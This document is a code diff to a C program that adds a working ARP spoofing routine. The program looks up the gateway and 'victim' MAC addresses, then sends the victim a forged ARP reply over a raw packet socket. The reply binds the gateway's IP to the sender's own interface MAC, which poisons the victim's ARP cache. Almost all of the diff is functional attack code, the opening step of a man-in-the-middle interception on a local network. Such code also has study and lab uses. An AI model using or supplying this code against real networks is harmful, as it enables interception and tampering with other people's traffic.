@@ -123,6 +123,59 @@ void request_mac(int fd, struct ether_arp *req, const char *ip_str)
 	}
 }
 
+void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, uint32_t gateway_ip)
+{
+	/* yes, it's a lot of copy/paste, but it works */
+	struct ether_arp resp;
+	struct in_addr ip_addr = {0};
+	if (!inet_aton(victim_ip, &ip_addr)) {
+		DIE("%s\n", strerror(errno));
+	}
+
+	const char *if_name = INTERFACE;
+	struct ifreq ifr;
+	size_t if_name_len = strlen(if_name);
+	if (if_name_len < sizeof(ifr.ifr_name)) {
+		memcpy(ifr.ifr_name, if_name, if_name_len);
+		ifr.ifr_name[if_name_len] = 0;
+	} else {
+		DIE("%s\n", "interface name is too long");
+	}
+
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
+		DIE("%s\n", strerror(errno));
+	}
+	int ifindex = ifr.ifr_ifindex;
+
+	struct sockaddr_ll addr = {0};
+	addr.sll_family   = AF_PACKET;
+	addr.sll_ifindex  = ifindex;
+	addr.sll_halen    = ETHER_ADDR_LEN;
+	addr.sll_protocol = htons(ETH_P_ARP);
+	memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);
+
+	resp.arp_hrd = htons(ARPHRD_ETHER);
+	resp.arp_pro = htons(ETH_P_IP);
+	resp.arp_hln = ETHER_ADDR_LEN;
+	resp.arp_pln = sizeof(in_addr_t);
+	resp.arp_op  = htons(ARPOP_REPLY);
+
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
+		DIE("%s\n", strerror(errno));
+	}
+	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
+		DIE("%s\n", "not an ethernet interface");
+	}
+	memcpy(&resp.arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(resp.arp_sha));
+	memcpy(&resp.arp_spa, &gateway_ip, sizeof(resp.arp_spa));
+	memcpy(&resp.arp_tha, victim_mac, sizeof(resp.arp_tha));
+	memcpy(&resp.arp_tpa, &ip_addr.s_addr, sizeof(resp.arp_tpa));
+
+	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
+		DIE("%s\n", strerror(errno));
+	}
+}
+
 int main(int argc, char *argv[])
 {
 	if (argc < 2) {
@@ -136,12 +189,15 @@ int main(int argc, char *argv[])
 	}
 
 	struct ether_arp req;
+	uint32_t gateway_ip = get_gateway();
 
-	request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = get_gateway() }));
+	request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = gateway_ip }));
 	PRINT_MAC("Gateway MAC address", req.arp_sha);
 
 	request_mac(fd, &req, argv[1]);
 	PRINT_MAC("Victim MAC address", req.arp_sha);
+
+	arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
 
 	return 0;
 }
